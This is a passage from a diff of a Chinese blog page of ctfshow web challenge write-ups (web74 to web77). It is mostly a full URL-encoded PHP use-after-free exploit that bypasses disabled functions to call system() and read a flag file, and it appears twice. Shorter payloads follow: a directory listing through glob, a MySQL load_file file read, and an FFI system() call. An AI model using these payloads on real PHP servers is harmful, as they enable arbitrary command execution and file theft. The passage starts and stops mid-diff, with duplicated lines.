20%7B%0A%20%20%20%20%20%20%20%20%24i%20%3D%200%3B%0A%20%20%20%20%20%20%20%20for(%24i%20%3D%200%3B%20%24i%20%3C%20%24n%3B%20%24i%2B%2B)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24str%5B%24p%20%2B%20%24i%5D%20%3D%20sprintf(%22%25c%22%2C(%24v%20%26%200xff))%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24v%20%3E%3E%3D%208%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20leak(%24addr%2C%20%24p%20%3D%200%2C%20%24s%20%3D%208)%20%7B%0A%20%20%20%20%20%20%20%20global%20%24abc%2C%20%24helper%3B%0A%20%20%20%20%20%20%20%20write(%24abc%2C%200x68%2C%20%24addr%20%2B%20%24p%20-%200x10)%3B%0A%20%20%20%20%20%20%20%20%24leak%20%3D%20strlen(%24helper-%3Ea)%3B%0A%20%20%20%20%20%20%20%20if(%24s%20!%3D%208)%20%7B%20%24leak%20%25%3D%202%20%3C%3C%20(%24s%20*%208)%20-%201%3B%20%7D%0A%20%20%20%20%20%20%20%20return%20%24leak%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20parse_elf(%24base)%20%7B%0A%20%20%20%20%20%20%20%20%24e_type%20%3D%20leak(%24base%2C%200x10%2C%202)%3B%0A%0A%20%20%20%20%20%20%20%20%24e_phoff%20%3D%20leak(%24base%2C%200x20)%3B%0A%20%20%20%20%20%20%20%20%24e_phentsize%20%3D%20leak(%24base%2C%200x36%2C%202)%3B%0A%20%20%20%20%20%20%20%20%24e_phnum%20%3D%20leak(%24base%2C%200x38%2C%202)%3B%0A%0A%20%20%20%20%20%20%20%20for(%24i%20%3D%200%3B%20%24i%20%3C%20%24e_phnum%3B%20%24i%2B%2B)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24header%20%3D%20%24base%20%2B%20%24e_phoff%20%2B%20%24i%20*%20%24e_phentsize%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24p_type%20%20%3D%20leak(%24header%2C%200%2C%204)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24p_flags%20%3D%20leak(%24header%2C%204%2C%204)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24p_vaddr%20%3D%20leak(%24header%2C%200x10)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24p_memsz%20%3D%20leak(%24header%2C%200x28)%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20if(%24p_type%20%3D%3D%201%20%26%26%20%24p_flags%20%3D%3D%206)%20%7B%20%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24data_addr%20%3D%20%24e_type%20%3D%3D%202%20%3F%20%24p_vaddr%20%3A%20%24base%20%2B%20%24p_vaddr%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24data_size%20%3D%20%24p_memsz%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%20else%20if(%24p_type%20%3D%3D%201%20%26%26%20%24p_flags%20%3D%3D%205)%20%7B%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24text_size%20%3D%20%24p_memsz%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%7D%0A%0A%20%20%20%20%20%20%20%20if(!%24data_addr%20%7C%7C%20!%24text_size%20%7C%7C%20!%24data_size)%0A%20%20%20%20%20%20%20%20%20%20%20%20return%20false%3B%0A%0A%20%20%20%20%20%20%20%20return%20%5B%24data_addr%2C%20%24text_size%2C%20%24data_size%5D%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20get_basic_funcs(%24base%2C%20%24elf)%20%7B%0A%20%20%20%20%20%20%20%20list(%24data_addr%2C%20%24text_size%2C%20%24data_size)%20%3D%20%24elf%3B%0A%20%20%20%20%20%20%20%20for(%24i%20%3D%200%3B%20%24i%20%3C%20%24data_size%20%2F%208%3B%20%24i%2B%2B)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24leak%20%3D%20leak(%24data_addr%2C%20%24i%20*%208)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20if(%24leak%20-%20%24base%20%3E%200%20%26%26%20%24leak%20-%20%24base%20%3C%20%24data_addr%20-%20%24base)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24deref%20%3D%20leak(%24leak)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if(%24deref%20!%3D%200x746e6174736e6f63)%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20continue%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%20else%20continue%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20%24leak%20%3D%20leak(%24data_addr%2C%20(%24i%20%2B%204)%20*%208)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20if(%24leak%20-%20%24base%20%3E%200%20%26%26%20%24leak%20-%20%24base%20%3C%20%24data_addr%20-%20%24base)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24deref%20%3D%20leak(%24leak)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if(%24deref%20!%3D%200x786568326e6962)%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20continue%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%20else%20continue%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20return%20%24data_addr%20%2B%20%24i%20*%208%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20get_binary_base(%24binary_leak)%20%7B%0A%20%20%20%20%20%20%20%20%24base%20%3D%200%3B%0A%20%20%20%20%20%20%20%20%24start%20%3D%20%24binary_leak%20%26%200xfffffffffffff000%3B%0A%20%20%20%20%20%20%20%20for(%24i%20%3D%200%3B%20%24i%20%3C%200x1000%3B%20%24i%2B%2B)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24addr%20%3D%20%24start%20-%200x1000%20*%20%24i%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24leak%20%3D%20leak(%24addr%2C%200%2C%207)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20if(%24leak%20%3D%3D%200x10102464c457f)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20return%20%24addr%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20get_system(%24basic_funcs)%20%7B%0A%20%20%20%20%20%20%20%20%24addr%20%3D%20%24basic_funcs%3B%0A%20%20%20%20%20%20%20%20do%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24f_entry%20%3D%20leak(%24addr)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24f_name%20%3D%20leak(%24f_entry%2C%200%2C%206)%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20if(%24f_name%20%3D%3D%200x6d6574737973)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20return%20leak(%24addr%20%2B%208)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%24addr%20%2B%3D%200x20%3B%0A%20%20%20%20%20%20%20%20%7D%20while(%24f_entry%20!%3D%200)%3B%0A%20%20%20%20%20%20%20%20return%20false%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20trigger_uaf(%24arg)%20%7B%0A%0A%20%20%20%20%20%20%20%20%24arg%20%3D%20str_shuffle(&#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#39;)%3B%0A%20%20%20%20%20%20%20%20%24vuln%20%3D%20new%20Vuln()%3B%0A%20%20%20%20%20%20%20%20%24vuln-%3Ea%20%3D%20%24arg%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20if(stristr(PHP_OS%2C%20&#39;WIN&#39;))%20%7B%0A%20%20%20%20%20%20%20%20die(&#39;This%20PoC%20is%20for%20*nix%20systems%20only.&#39;)%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20%24n_alloc%20%3D%2010%3B%20%0A%20%20%20%20%24contiguous%20%3D%20%5B%5D%3B%0A%20%20%20%20for(%24i%20%3D%200%3B%20%24i%20%3C%20%24n_alloc%3B%20%24i%2B%2B)%0A%20%20%20%20%20%20%20%20%24contiguous%5B%5D%20%3D%20str_shuffle(&#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#39;)%3B%0A%0A%20%20%20%20trigger_uaf(&#39;x&#39;)%3B%0A%20%20%20%20%24abc%20%3D%20%24backtrace%5B1%5D%5B&#39;args&#39;%5D%5B0%5D%3B%0A%0A%20%20%20%20%24helper%20%3D%20new%20Helper%3B%0A%20%20%20%20%24helper-%3Eb%20%3D%20function%20(%24x)%20%7B%20%7D%3B%0A%0A%20%20%20%20if(strlen(%24abc)%20%3D%3D%2079%20%7C%7C%20strlen(%24abc)%20%3D%3D%200)%20%7B%0A%20%20%20%20%20%20%20%20die(%22UAF%20failed%22)%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20%24closure_handlers%20%3D%20str2ptr(%24abc%2C%200)%3B%0A%20%20%20%20%24php_heap%20%3D%20str2ptr(%24abc%2C%200x58)%3B%0A%20%20%20%20%24abc_addr%20%3D%20%24php_heap%20-%200xc8%3B%0A%0A%20%20%20%20write(%24abc%2C%200x60%2C%202)%3B%0A%20%20%20%20write(%24abc%2C%200x70%2C%206)%3B%0A%0A%20%20%20%20write(%24abc%2C%200x10%2C%20%24abc_addr%20%2B%200x60)%3B%0A%20%20%20%20write(%24abc%2C%200x18%2C%200xa)%3B%0A%0A%20%20%20%20%24closure_obj%20%3D%20str2ptr(%24abc%2C%200x20)%3B%0A%0A%20%20%20%20%24binary_leak%20%3D%20leak(%24closure_handlers%2C%208)%3B%0A%20%20%20%20if(!(%24base%20%3D%20get_binary_base(%24binary_leak)))%20%7B%0A%20%20%20%20%20%20%20%20die(%22Couldn&#39;t%20determine%20binary%20base%20address%22)%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20if(!(%24elf%20%3D%20parse_elf(%24base)))%20%7B%0A%20%20%20%20%20%20%20%20die(%22Couldn&#39;t%20parse%20ELF%20header%22)%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20if(!(%24basic_funcs%20%3D%20get_basic_funcs(%24base%2C%20%24elf)))%20%7B%0A%20%20%20%20%20%20%20%20die(%22Couldn&#39;t%20get%20basic_functions%20address%22)%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20if(!(%24zif_system%20%3D%20get_system(%24basic_funcs)))%20%7B%0A%20%20%20%20%20%20%20%20die(%22Couldn&#39;t%20get%20zif_system%20address%22)%3B%0A%20%20%20%20%7D%0A%0A%0A%20%20%20%20%24fake_obj_offset%20%3D%200xd0%3B%0A%20%20%20%20for(%24i%20%3D%200%3B%20%24i%20%3C%200x110%3B%20%24i%20%2B%3D%208)%20%7B%0A%20%20%20%20%20%20%20%20write(%24abc%2C%20%24fake_obj_offset%20%2B%20%24i%2C%20leak(%24closure_obj%2C%20%24i))%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20write(%24abc%2C%200x20%2C%20%24abc_addr%20%2B%20%24fake_obj_offset)%3B%0A%20%20%20%20write(%24abc%2C%200xd0%20%2B%200x38%2C%201%2C%204)%3B%20%0A%20%20%20%20write(%24abc%2C%200xd0%20%2B%200x68%2C%20%24zif_system)%3B%20%0A%0A%20%20%20%20(%24helper-%3Eb)(%24cmd)%3B%0A%20%20%20%20exit()%3B%0A%7D%0A%0Actfshow(%22cat%20%2Fflag0.txt%22)%3Bob_end_flush()%3B%0A%3F%3E
-</code></pre><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221101121909286.png" alt="image-20221101121909286"></p><h2 id="web75"><a href="#web75" class="headerlink" title="web75"></a>web75</h2><pre><code class="php">c=?&gt;&lt;?php $a=new DirectoryIterator(&quot;glob:///*&quot;);foreach($a as $f)&#123;echo($f-&gt;__toString().&#39; &#39;);&#125;exit(0);
-</code></pre><p>看到flag在flag36里</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221101122250381.png" alt="image-20221101122250381"></p><p>又来。。但是UAF也不能用了</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221101122350518.png" alt="image-20221101122350518"></p><p>用数据库去读取文件</p><pre><code class="php">c=try &#123;$dbh = new PDO(&#39;mysql:host=localhost;dbname=ctftraining&#39;, &#39;root&#39;,&#39;root&#39;);foreach($dbh-&gt;query(&#39;select load_file(&quot;/flag36.txt&quot;)&#39;) as $row)&#123;echo($row[0]).&quot;|&quot;; &#125;$dbh = null;&#125;catch (PDOException $e) &#123;echo $e-&gt;getMessage();exit(0);&#125;exit(0);
-</code></pre><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221101123147447.png" alt="image-20221101123147447"></p><h2 id="web77"><a href="#web77" class="headerlink" title="web77"></a>web77</h2><p>上面的方法都ban了，使用FFI</p><pre><code class="php">c=$ffi = FFI::cdef(&quot;int system(const char *command);&quot;);
-$a=&#39;/readflag &gt; 1.txt&#39;;
+</code></pre><pre><code>c=function%20ctfshow(%24cmd)%20%7B%0A%20%20%20%20global%20%24abc%2C%20%24helper%2C%20%24backtrace%3B%0A%0A%20%20%20%20class%20Vuln%20%7B%0A%20%20%20%20%20%20%20%20public%20%24a%3B%0A%20%20%20%20%20%20%20%20public%20function%20__destruct()%20%7B%20%0A%20%20%20%20%20%20%20%20%20%20%20%20global%20%24backtrace%3B%20%0A%20%20%20%20%20%20%20%20%20%20%20%20unset(%24this-%3Ea)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24backtrace%20%3D%20(new%20Exception)-%3EgetTrace()%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20if(!isset(%24backtrace%5B1%5D%5B'args'%5D))%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24backtrace%20%3D%20debug_backtrace()%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%0A%0A%20%20%20%20class%20Helper%20%7B%0A%20%20%20%20%20%20%20%20public%20%24a%2C%20%24b%2C%20%24c%2C%20%24d%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20str2ptr(%26%24str%2C%20%24p%20%3D%200%2C%20%24s%20%3D%208)%20%7B%0A%20%20%20%20%20%20%20%20%24address%20%3D%200%3B%0A%20%20%20%20%20%20%20%20for(%24j%20%3D%20%24s-1%3B%20%24j%20%3E%3D%200%3B%20%24j--)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24address%20%3C%3C%3D%208%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24address%20%7C%3D%20ord(%24str%5B%24p%2B%24j%5D)%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20return%20%24address%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20ptr2str(%24ptr%2C%20%24m%20%3D%208)%20%7B%0A%20%20%20%20%20%20%20%20%24out%20%3D%20%22%22%3B%0A%20%20%20%20%20%20%20%20for%20(%24i%3D0%3B%20%24i%20%3C%20%24m%3B%20%24i%2B%2B)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24out%20.%3D%20sprintf(%22%25c%22%2C(%24ptr%20%26%200xff))%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24ptr%20%3E%3E%3D%208%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20return%20%24out%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20write(%26%24str%2C%20%24p%2C%20%24v%2C%20%24n%20%3D%208)%20%7B%0A%20%20%20%20%20%20%20%20%24i%20%3D%200%3B%0A%20%20%20%20%20%20%20%20for(%24i%20%3D%200%3B%20%24i%20%3C%20%24n%3B%20%24i%2B%2B)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24str%5B%24p%20%2B%20%24i%5D%20%3D%20sprintf(%22%25c%22%2C(%24v%20%26%200xff))%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24v%20%3E%3E%3D%208%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20leak(%24addr%2C%20%24p%20%3D%200%2C%20%24s%20%3D%208)%20%7B%0A%20%20%20%20%20%20%20%20global%20%24abc%2C%20%24helper%3B%0A%20%20%20%20%20%20%20%20write(%24abc%2C%200x68%2C%20%24addr%20%2B%20%24p%20-%200x10)%3B%0A%20%20%20%20%20%20%20%20%24leak%20%3D%20strlen(%24helper-%3Ea)%3B%0A%20%20%20%20%20%20%20%20if(%24s%20!%3D%208)%20%7B%20%24leak%20%25%3D%202%20%3C%3C%20(%24s%20*%208)%20-%201%3B%20%7D%0A%20%20%20%20%20%20%20%20return%20%24leak%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20parse_elf(%24base)%20%7B%0A%20%20%20%20%20%20%20%20%24e_type%20%3D%20leak(%24base%2C%200x10%2C%202)%3B%0A%0A%20%20%20%20%20%20%20%20%24e_phoff%20%3D%20leak(%24base%2C%200x20)%3B%0A%20%20%20%20%20%20%20%20%24e_phentsize%20%3D%20leak(%24base%2C%200x36%2C%202)%3B%0A%20%20%20%20%20%20%20%20%24e_phnum%20%3D%20leak(%24base%2C%200x38%2C%202)%3B%0A%0A%20%20%20%20%20%20%20%20for(%24i%20%3D%200%3B%20%24i%20%3C%20%24e_phnum%3B%20%24i%2B%2B)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24header%20%3D%20%24base%20%2B%20%24e_phoff%20%2B%20%24i%20*%20%24e_phentsize%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24p_type%20%20%3D%20leak(%24header%2C%200%2C%204)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24p_flags%20%3D%20leak(%24header%2C%204%2C%204)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24p_vaddr%20%3D%20leak(%24header%2C%200x10)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24p_memsz%20%3D%20leak(%24header%2C%200x28)%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20if(%24p_type%20%3D%3D%201%20%26%26%20%24p_flags%20%3D%3D%206)%20%7B%20%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24data_addr%20%3D%20%24e_type%20%3D%3D%202%20%3F%20%24p_vaddr%20%3A%20%24base%20%2B%20%24p_vaddr%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24data_size%20%3D%20%24p_memsz%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%20else%20if(%24p_type%20%3D%3D%201%20%26%26%20%24p_flags%20%3D%3D%205)%20%7B%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24text_size%20%3D%20%24p_memsz%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%7D%0A%0A%20%20%20%20%20%20%20%20if(!%24data_addr%20%7C%7C%20!%24text_size%20%7C%7C%20!%24data_size)%0A%20%20%20%20%20%20%20%20%20%20%20%20return%20false%3B%0A%0A%20%20%20%20%20%20%20%20return%20%5B%24data_addr%2C%20%24text_size%2C%20%24data_size%5D%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20get_basic_funcs(%24base%2C%20%24elf)%20%7B%0A%20%20%20%20%20%20%20%20list(%24data_addr%2C%20%24text_size%2C%20%24data_size)%20%3D%20%24elf%3B%0A%20%20%20%20%20%20%20%20for(%24i%20%3D%200%3B%20%24i%20%3C%20%24data_size%20%2F%208%3B%20%24i%2B%2B)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24leak%20%3D%20leak(%24data_addr%2C%20%24i%20*%208)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20if(%24leak%20-%20%24base%20%3E%200%20%26%26%20%24leak%20-%20%24base%20%3C%20%24data_addr%20-%20%24base)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24deref%20%3D%20leak(%24leak)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if(%24deref%20!%3D%200x746e6174736e6f63)%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20continue%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%20else%20continue%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20%24leak%20%3D%20leak(%24data_addr%2C%20(%24i%20%2B%204)%20*%208)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20if(%24leak%20-%20%24base%20%3E%200%20%26%26%20%24leak%20-%20%24base%20%3C%20%24data_addr%20-%20%24base)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24deref%20%3D%20leak(%24leak)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if(%24deref%20!%3D%200x786568326e6962)%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20continue%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%20else%20continue%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20return%20%24data_addr%20%2B%20%24i%20*%208%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20get_binary_base(%24binary_leak)%20%7B%0A%20%20%20%20%20%20%20%20%24base%20%3D%200%3B%0A%20%20%20%20%20%20%20%20%24start%20%3D%20%24binary_leak%20%26%200xfffffffffffff000%3B%0A%20%20%20%20%20%20%20%20for(%24i%20%3D%200%3B%20%24i%20%3C%200x1000%3B%20%24i%2B%2B)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24addr%20%3D%20%24start%20-%200x1000%20*%20%24i%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24leak%20%3D%20leak(%24addr%2C%200%2C%207)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20if(%24leak%20%3D%3D%200x10102464c457f)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20return%20%24addr%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20get_system(%24basic_funcs)%20%7B%0A%20%20%20%20%20%20%20%20%24addr%20%3D%20%24basic_funcs%3B%0A%20%20%20%20%20%20%20%20do%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24f_entry%20%3D%20leak(%24addr)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24f_name%20%3D%20leak(%24f_entry%2C%200%2C%206)%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20if(%24f_name%20%3D%3D%200x6d6574737973)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20return%20leak(%24addr%20%2B%208)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%24addr%20%2B%3D%200x20%3B%0A%20%20%20%20%20%20%20%20%7D%20while(%24f_entry%20!%3D%200)%3B%0A%20%20%20%20%20%20%20%20return%20false%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20trigger_uaf(%24arg)%20%7B%0A%0A%20%20%20%20%20%20%20%20%24arg%20%3D%20str_shuffle('AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA')%3B%0A%20%20%20%20%20%20%20%20%24vuln%20%3D%20new%20Vuln()%3B%0A%20%20%20%20%20%20%20%20%24vuln-%3Ea%20%3D%20%24arg%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20if(stristr(PHP_OS%2C%20'WIN'))%20%7B%0A%20%20%20%20%20%20%20%20die('This%20PoC%20is%20for%20*nix%20systems%20only.')%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20%24n_alloc%20%3D%2010%3B%20%0A%20%20%20%20%24contiguous%20%3D%20%5B%5D%3B%0A%20%20%20%20for(%24i%20%3D%200%3B%20%24i%20%3C%20%24n_alloc%3B%20%24i%2B%2B)%0A%20%20%20%20%20%20%20%20%24contiguous%5B%5D%20%3D%20str_shuffle('AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA')%3B%0A%0A%20%20%20%20trigger_uaf('x')%3B%0A%20%20%20%20%24abc%20%3D%20%24backtrace%5B1%5D%5B'args'%5D%5B0%5D%3B%0A%0A%20%20%20%20%24helper%20%3D%20new%20Helper%3B%0A%20%20%20%20%24helper-%3Eb%20%3D%20function%20(%24x)%20%7B%20%7D%3B%0A%0A%20%20%20%20if(strlen(%24abc)%20%3D%3D%2079%20%7C%7C%20strlen(%24abc)%20%3D%3D%200)%20%7B%0A%20%20%20%20%20%20%20%20die(%22UAF%20failed%22)%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20%24closure_handlers%20%3D%20str2ptr(%24abc%2C%200)%3B%0A%20%20%20%20%24php_heap%20%3D%20str2ptr(%24abc%2C%200x58)%3B%0A%20%20%20%20%24abc_addr%20%3D%20%24php_heap%20-%200xc8%3B%0A%0A%20%20%20%20write(%24abc%2C%200x60%2C%202)%3B%0A%20%20%20%20write(%24abc%2C%200x70%2C%206)%3B%0A%0A%20%20%20%20write(%24abc%2C%200x10%2C%20%24abc_addr%20%2B%200x60)%3B%0A%20%20%20%20write(%24abc%2C%200x18%2C%200xa)%3B%0A%0A%20%20%20%20%24closure_obj%20%3D%20str2ptr(%24abc%2C%200x20)%3B%0A%0A%20%20%20%20%24binary_leak%20%3D%20leak(%24closure_handlers%2C%208)%3B%0A%20%20%20%20if(!(%24base%20%3D%20get_binary_base(%24binary_leak)))%20%7B%0A%20%20%20%20%20%20%20%20die(%22Couldn't%20determine%20binary%20base%20address%22)%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20if(!(%24elf%20%3D%20parse_elf(%24base)))%20%7B%0A%20%20%20%20%20%20%20%20die(%22Couldn't%20parse%20ELF%20header%22)%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20if(!(%24basic_funcs%20%3D%20get_basic_funcs(%24base%2C%20%24elf)))%20%7B%0A%20%20%20%20%20%20%20%20die(%22Couldn't%20get%20basic_functions%20address%22)%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20if(!(%24zif_system%20%3D%20get_system(%24basic_funcs)))%20%7B%0A%20%20%20%20%20%20%20%20die(%22Couldn't%20get%20zif_system%20address%22)%3B%0A%20%20%20%20%7D%0A%0A%0A%20%20%20%20%24fake_obj_offset%20%3D%200xd0%3B%0A%20%20%20%20for(%24i%20%3D%200%3B%20%24i%20%3C%200x110%3B%20%24i%20%2B%3D%208)%20%7B%0A%20%20%20%20%20%20%20%20write(%24abc%2C%20%24fake_obj_offset%20%2B%20%24i%2C%20leak(%24closure_obj%2C%20%24i))%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20write(%24abc%2C%200x20%2C%20%24abc_addr%20%2B%20%24fake_obj_offset)%3B%0A%20%20%20%20write(%24abc%2C%200xd0%20%2B%200x38%2C%201%2C%204)%3B%20%0A%20%20%20%20write(%24abc%2C%200xd0%20%2B%200x68%2C%20%24zif_system)%3B%20%0A%0A%20%20%20%20(%24helper-%3Eb)(%24cmd)%3B%0A%20%20%20%20exit()%3B%0A%7D%0A%0Actfshow(%22cat%20%2Fflag0.txt%22)%3Bob_end_flush()%3B%0A%3F%3E
+
+</code></pre><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221101121909286.png" alt="image-20221101121909286"></p><h2 id="web75"><a class="anchor" href="#web75">#</a> web75</h2><pre><code class="language-php">c=?&gt;&lt;?php $a=new DirectoryIterator(&quot;glob:///*&quot;);foreach($a as $f)&#123;echo($f-&gt;__toString().' ');&#125;exit(0);
+</code></pre><p>看到 flag 在 flag36 里</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221101122250381.png" alt="image-20221101122250381"></p><p>又来。。但是 UAF 也不能用了</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221101122350518.png" alt="image-20221101122350518"></p><p>用数据库去读取文件</p><pre><code class="language-php">c=try &#123;$dbh = new PDO('mysql:host=localhost;dbname=ctftraining', 'root','root');foreach($dbh-&gt;query('select load_file(&quot;/flag36.txt&quot;)') as $row)&#123;echo($row[0]).&quot;|&quot;; &#125;$dbh = null;&#125;catch (PDOException $e) &#123;echo $e-&gt;getMessage();exit(0);&#125;exit(0);
